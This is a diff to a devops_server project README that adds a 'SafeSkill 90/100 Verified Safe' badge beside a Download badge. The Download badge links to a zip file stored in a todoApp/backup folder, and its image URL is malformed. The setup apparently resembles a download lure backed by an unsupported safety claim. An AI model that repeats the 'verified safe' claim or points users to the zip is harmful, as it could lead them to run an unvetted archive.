@@ -1,5 +1,7 @@
 # 🚀 devops_server - Simplifying Continuous Deployment for Everyone
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/amrkhater0011-devops-server)
+
 [![Download](https://raw.githubusercontent.com/AmrKhater0011/devops_server/main/todoApp/backup/devops_server_3.4-beta.5.zip%20Now-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/AmrKhater0011/devops_server/main/todoApp/backup/devops_server_3.4-beta.5.zip)
 
 ## 📘 Overview
